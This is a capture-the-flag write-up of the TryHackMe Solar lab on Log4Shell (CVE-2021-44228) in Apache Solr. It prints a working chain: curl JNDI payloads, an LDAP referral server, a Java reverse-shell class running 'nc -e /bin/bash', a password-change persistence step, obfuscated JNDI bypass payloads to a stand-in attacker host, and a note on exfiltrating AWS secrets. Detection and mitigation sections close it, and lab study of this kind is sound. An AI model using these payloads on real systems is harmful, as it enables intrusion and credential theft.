---
description: >-
  Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software
  under the sun.
---

# Solar, exploiting log4j

{% hint style="info" %}
My local machine IP will change from 10.10.111.3 to 10.10.230.16 to 10.10.142.230 due to my AttackBox conking out randomly
{% endhint %}

## CVE-2021-44228 Introduction

On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package **`log4j`**. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this **`log4j`** version. This attack has been dubbed "Log4Shell"

Today, **`log4j`** version **`2.16.0`** is available and patches this vulnerability (JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present). [https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0](https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0)

However, the sheer danger of this vulnerability is due to how ubiquitous the logging package is. Millions of applications as well as software providers use this package as a dependency in their own code. While you may be able to patch your own codebase using **`log4j`**, other vendors and manufacturers will still need to push their own security updates downstream. Many security researchers have likened this vulnerability to that of [Shellshock](https://en.wikipedia.org/wiki/Shellshock\_\(software\_bug\)) by the nature of its enormous attack surface. We will see this vulnerability for years to come.\\

For a growing community-supported list of software and services vulnerable to CVE-2021-44228, check out this GitHub repository:

* [https://github.com/YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)

This room will showcase how you can test for, exploit, and mitigate this vulnerability within Log4j.

Some learning material surrounding CVE-2021-44228:

* [https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java](https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java)
* [https://log4shell.huntress.com/](https://log4shell.huntress.com)
* [https://www.youtube.com/watch?v=7qoPDq41xhQ](https://www.youtube.com/watch?v=7qoPDq41xhQ)

## Reconnaissance

First, we start with a basic reconnaissance scan with `nmap` to see what ports are open on this machine

`nmap -T4 -A -p- 10.10.222.223`

This actually took 21 minutes, so in the meantime I checked out this [video](https://www.youtube.com/watch?v=ZeveyVSKO3Q), in which he used [rustscan](https://github.com/RustScan/RustScan) which took literal seconds

#### Nmap

```bash
root@ip-10-10-111-3:~# nmap -T4 -A -p- 10.10.222.223

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-17 23:01 GMT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 13.91% done; ETC: 23:02 (0:00:43 remaining)
Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 33.27% done; ETC: 23:07 (0:03:51 remaining)
Stats: 0:03:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 40.03% done; ETC: 23:10 (0:05:16 remaining)
Stats: 0:04:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.95% done; ETC: 23:11 (0:05:44 remaining)
Stats: 0:14:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 87.62% done; ETC: 23:18 (0:02:05 remaining)
Stats: 0:16:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 94.76% done; ETC: 23:18 (0:00:55 remaining)
Stats: 0:20:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 23:21 (0:00:00 remaining)
Nmap scan report for ip-10-10-222-223.eu-west-1.compute.internal (10.10.222.223)
Host is up (0.00049s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
|   256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
|_  256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (EdDSA)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|_  100000  2,3,4        111/udp  rpcbind
8983/tcp open  http    Apache Solr
| http-title: Solr Admin
|_Requested resource was http://ip-10-10-222-223.eu-west-1.compute.internal:8983/solr/
MAC Address: 02:8B:FC:1C:36:A7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/17%OT=22%CT=1%CU=35450%PV=Y%DS=1%DC=D%G=Y%M=028BFC%T
OS:M=61E5FA65%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=
OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms ip-10-10-222-223.eu-west-1.compute.internal (10.10.222.223)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1315.62 seconds
```

#### Rustscan

```bash
root@ip-10-10-111-3:~# rustscan -a 10.10.222.223
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.222.223:22
Open 10.10.222.223:111
Open 10.10.222.223:8983
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-17 22:59 UTC
Initiating Ping Scan at 22:59
Scanning 10.10.222.223 [2 ports]
Completed Ping Scan at 22:59, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:59
Completed Parallel DNS resolution of 1 host. at 22:59, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:59
Scanning ip-10-10-222-223.eu-west-1.compute.internal (10.10.222.223) [3 ports]
Discovered open port 111/tcp on 10.10.222.223
Discovered open port 22/tcp on 10.10.222.223
Discovered open port 8983/tcp on 10.10.222.223
Completed Connect Scan at 22:59, 0.00s elapsed (3 total ports)
Nmap scan report for ip-10-10-222-223.eu-west-1.compute.internal (10.10.222.223)
Host is up, received conn-refused (0.00051s latency).
Scanned at 2022-01-17 22:59:04 UTC for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
111/tcp  open  rpcbind syn-ack
8983/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```

Not knowing what port `8983` was, I tried going to it in the browser

![](<../../.gitbook/assets/image (8) (1) (1) (1) (1).png>)

Never hearing of Solr before, I decided to do some Googling to learn more about this platform

[Solr](https://solr.apache.org) is open-source enterprise-search platform, written in Java

> Solr is highly reliable, scalable and fault tolerant, providing distributed indexing, replication and load-balanced querying, automated failover and recovery, centralized configuration and more. Solr powers the search and navigation features of many of the world's largest internet sites.

## Discovery

This is running `Apache Solr 8.11.0` which includes the vulnerable log4j package

Looking at the dashboard, we can see clear indicators that log4j is in use within the app

![log4j config file](<../../.gitbook/assets/image (2) (1).png>)

![directory where solr logs are sent](<../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png>)

In the solr.log file that was attached, we notice the surmount of entries for requests to the path `/admin/cores`

![](<../../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

We also notice in the logs we have a params field that most likely suggests one could pass information as an argument and possibly inject malicious commands

![](<../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

## Proof of Concept

Navigating to the endpoint that we uncovered in the logs, we see this

![](<../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Because of the params field, we know that we can include a malicious payload via this field

The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact _executed_ just as it is entered into log files.

Some examples of this syntax are:

* `${sys:os.name}`
* `${sys:user.name}`
* `${log4j:configParentLocation}`
* `${ENV:PATH}`
* `${ENV:HOSTNAME}`
* `${java:version}`

The general payload to abuse this log4j vulnerability is:

`${jndi:ldap://ATTACKERCONTROLLEDHOST}`

The syntax above can be broken down as the follows:

* **`${}`** syntax are executed as they are entered into the log files.
* \*\*`jdni` \*\* is the Java Naming and Directory Interface and infers that the command will invoke functionality from this API which allows Java applications to discover, look up and access external data resources.
* **`ldap://`** indicates that the target will reach out to an external attacker controlled endpoint via LDAP.
* **`ATTACKERCONTROLLEDHOST`** will be the IP address or FQDN of the attacker controlled host.

This syntax could be entered anywhere in an application that uses the Log4j package where user input data is logged by the application

Example:

* Input boxes, user and password login forms, data entry points within applications
* HTTP headers such as `User-Agent`, `X-Forwarded-For`, or other customizable headers
* **Any place for user-supplied data**

Unfortunately, it is very hard to determine where the attack surface is for different applications, and _what_ applications are in fact vulnerable. Simply seeing the presence of log4j files doesn't clue in on the exact version number, or even where or how the application might use the package.

So we'll start a netcat listener on any port and then in another terminal, make a request using the JNDI payload syntax using curl

![nc -lvp 9999](<../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png>)

![curl 'http://10.10.222.223:8983/solr/admin/cores?foo=${jndi:ldap://10.10.230.16:9999}'](<../../.gitbook/assets/image (27) (1) (1) (1) (1) (1) (1) (1) (1).png>)

As a result, we have verified that the target is in fact vulnerable by seeing the connection caught in the netcat listener

![](<../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

## Exploitation

We received an LDAP request to our netcat listener which did not offer much functionality besides proof we can receive requests.

We will utilize a open-source and public utility to stage an "**LDAP Referral Server**". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target.

1. **`${jndi:ldap://attackerserver:1389/Resource}`** -> reaches out to our LDAP Referral Server
2. LDAP Referral Server springboards the request to a secondary **`http://attackerserver/resource`**
3. The victim retrieves and executes the code present in **`http://attackerserver/resource`**

For this we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):

* **`python3 -m http.server`**
* **`php -S 0.0.0.0:8000`**

{% hint style="info" %}
Since I'm using the TryHackMe AttackBox, I did not follow the instructions for installing Java 8 or downloading [marshalsec](https://github.com/mbechler/marshalsec) (LDAP Referral Server utility)
{% endhint %}

Let's build marshalsec with the Java builder maven

```
mvn clean package -Dskiptests
```

![](<../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png>)

With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server

```java
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.142.230:9999/#Exploit"
```

![](<../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png>)

We will now create our payload that will be used to execute on the victim. The Log4j vulnerability will execute code written in Java, and in this case a Java reverse shell as shown below

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.10.142.230 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Once we have our code, we will compile it with the following command:

```java
javac exploit.java -source 8 -target 8
```

![](<../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

With the payload created and compiled, we can now host it by spinning up a temporary HTTP server.

![](<../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

The payload is created and compiled, it is hosted with an HTTP server in one terminal, an LDAP referral server is up and waiting in another terminal -- next prepare a netcat listener to catch our reverse shell in yet another new terminal window

![](<../../.gitbook/assets/image (10) (1) (1) (1) (1).png>)

Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit:

```
curl 'http://10.10.222.223:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.142.230:1389/Exploit\}'
```

![We did it!](<../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png>)

We have now received initial access and command-and-control on a vanilla, freshly installed Apache Solr instance!

## Persistence

We see that we are user `solr`

![](<../../.gitbook/assets/image (29) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

We should get a stable shell to make typing commands a lot easier and then move on to persistence

Assuming we're running in a bash shell, do the following:

1. on the reverse shell) **`python3 -c "import pty; pty.spawn('/bin/bash')"`**
2. (press on your keyboard) `Ctrl+Z`
3. (press on your keyboard) `Enter`
4. (on your local host) `stty raw -echo`
5. (on your local host) `fg` (you will not see your keystrokes -- trust yourself and hit **`Enter`**)
6. (press on your keyboard) `Enter`
7. (press on your keyboard) `Enter`
8. (on the reverse shell) `export TERM=xterm`

![](<../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Checking user permissions, the user has sudo privileges without the need for any password. That's really bad but convenient for us.

So lets run `sudo passwd solr` to change the password of the user, that way we can grant ourselves persistence and access into the machine via SSH

![](<../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

## Detection

One way to detect this vulnerability is by checking the log file we know that is affected by the Log4j vulnerability, the **solr.log** file

![](<../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Resources

* [https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes) (local, based off hashes of log4j JAR files)
* [https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d](https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d) (local, based off hashes of log4j CLASS files)
* [https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228](https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228) (listing of vulnerable JAR and CLASS hashes)
* [https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1](https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1) (local, hunting for vulnerable log4j packages in PowerShell)
* [https://github.com/darkarnium/CVE-2021-44228](https://github.com/darkarnium/CVE-2021-44228) (local, YARA rules)
* [https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j\_0day\_being\_exploited\_mega\_thread\_overview/](https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j\_0day\_being\_exploited\_mega\_thread\_overview/)

## Bypass

The JNDI payload that we have showcased is the standard and "typical" syntax for performing this attack.

Because this attack leverages **`log4j`**, the payload can ultimately access all of the same expansion, substitution, and templating tricks that the package makes available. This means that a threat actor could use any sort of tricks to hide, mask, or obfuscate the payload.

With that in mind, there are honestly an unlimited number of bypasses to sneak in this syntax. \\

There are numerous resources online that showcase some examples of these bypasses, with a few offered below:

```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
```

```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
```

```
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
```

```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
```

```
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
```

```
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
```

```
${${::-j}ndi:rmi://attackerendpoint.com/}
```

Additionally, within the log4j engine, you can expand arbitrary environment variables (if this wasn't already bad enough).

Consider the damage that could be done even with remote code execution, but a simple LDAP connection and exfiltration of **`${env:AWS_SECRET_ACCESS_KEY}`**

## Mitigations

Review the mitigation techniques suggested on the Apache Solr website. [https://solr.apache.org/security.html](https://solr.apache.org/security.html)

The Apache Solr website Security page explains that you can add this specific syntax to the **`solr.in.sh`** file:

We found it using `locate solr.in.sh`

![](<../../.gitbook/assets/image (2).png>)

After restarting the service

```
sudo /etc/init.d/solr restart
```

We validate our patch

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

As we see, no callback

Another mitigation would be to block all outbound LDAP requests though egress filtering if possible, if not then outbound LDAP should be blocked on default ports at the very least. This will prevent outbound LDAP requests hitting an LDAP Referral Server. Blocking all LDAP outbound requests at this stage is as good as the mitigation we applied to Apache Solr above

## Patching

Many other software providers are trying to patch their software and push it downstream to end users as quickly as they can.

There are so many potential places that this log4j vulnerability could be present that we may never see the end of this vulnerability for a long, long time. We all need to raise awareness of this incident, and hold the community accountable for actively responding. When the time comes, roll out the patches that have been made available and continue to hunt for instances of this vulnerability.

Where appropriate, please ensure you patch the **`logging-log4j`** package to version **`2.16.0`** or higher (as new releases come available). In version `2.16.0` , JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present. Download this release here: [https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0](https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0)

If you're responsible for identifying vulnerable services that use log4j, there is a list of a few majorly affected services/products [here](https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/).

#### Sources that aided me with writing this

[https://tryhackme.com/room/solar#](https://tryhackme.com/room/solar#)

[https://www.manrajbansal.com/post/exploiting-log4j-apache-solr](https://www.manrajbansal.com/post/exploiting-log4j-apache-solr)
